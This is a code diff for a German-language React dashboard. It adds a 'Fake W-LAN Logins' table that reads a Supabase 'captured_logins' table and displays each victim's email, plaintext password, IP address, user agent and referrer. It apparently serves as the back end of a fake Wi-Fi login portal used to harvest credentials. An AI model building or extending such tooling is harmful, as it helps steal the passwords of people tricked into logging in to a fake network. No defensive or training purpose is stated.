@@ -114,6 +114,17 @@ console.error(
 return <div>Fehler beim Laden der Email Input Daten.</div>;
 }
 
+const { data: captured_logins, error: capturedLoginsFakeWLanError } =
+await supabaseClient
+  .from("captured_logins")
+  .select("*");
+if (capturedLoginsFakeWLanError) {
+console.error(
+  "Supabase Error:",
+  capturedLoginsFakeWLanError?.message || "Unknown error"
+);
+return <div>Fehler beim Laden der Email Input Daten.</div>;
+}
   return (
     <main className="min-h-screen bg-gray-100 p-6">
       <div className="max-w-4xl mx-auto space-y-8">
@@ -299,7 +310,7 @@ return <div>Fehler beim Laden der Email Input Daten.</div>;
               
               <TableHeader >
                 <TableRow >
-                <TableHead className="w-[150px]">Zeit</TableHead>
+                <TableHead className="w-[150px]">Datum</TableHead>
                   <TableHead className="w-[150px]">Name</TableHead>
                   <TableHead className="w-[150px]">E-Mail</TableHead>
                   <TableHead className="w-[150px]">Passwort</TableHead>
@@ -355,6 +366,38 @@ return <div>Fehler beim Laden der Email Input Daten.</div>;
                     <TableCell>{entry.device_type}</TableCell>
                     <TableCell>{entry.browser}</TableCell>
                     <TableCell>{entry.os}</TableCell>
+                    <TableCell>{entry.referrer}</TableCell>
+                  </TableRow>
+                ))}
+              </TableBody>
+            </Table>
+          </div>
+          <h3 className=" font-semibold mb-4 px-4 pt-5 pb-2">Fake W-LAN Logins</h3>
+          <div className="max-h-[300px] overflow-y-auto rounded-md border m-4">
+            <Table>
+              <TableCaption>Fake W-LAN Logins</TableCaption>
+              <TableHeader>
+                <TableRow>
+                  <TableHead className="w-[150px]">Datum</TableHead>
+                  <TableHead className="w-[150px]">E-Mail</TableHead>
+                  <TableHead className="w-[150px]">Passwort</TableHead>
+                  <TableHead className="w-[150px]">IP</TableHead>
+                  <TableHead className="w-[150px]">Sitzungsdauer</TableHead>
+                  <TableHead className="w-[150px]">User Agend</TableHead>
+                  <TableHead className="w-[150px]">Referrer</TableHead>
+                </TableRow>
+              </TableHeader>
+              <TableBody>
+                {captured_logins?.map((entry) => (
+                  <TableRow key={entry.id}>
+                    <TableCell>
+                      {new Date(entry.created_at).toLocaleString()}
+                    </TableCell>
+                    <TableCell>{entry.email}</TableCell>
+                    <TableCell>{entry.password}</TableCell>
+                    <TableCell>{entry.ip_address}</TableCell>
+                    <TableCell>{entry.session_duration}</TableCell>
+                    <TableCell>{entry.user_agent}</TableCell>
                     <TableCell>{entry.referrer}</TableCell>
                   </TableRow>
                 ))}
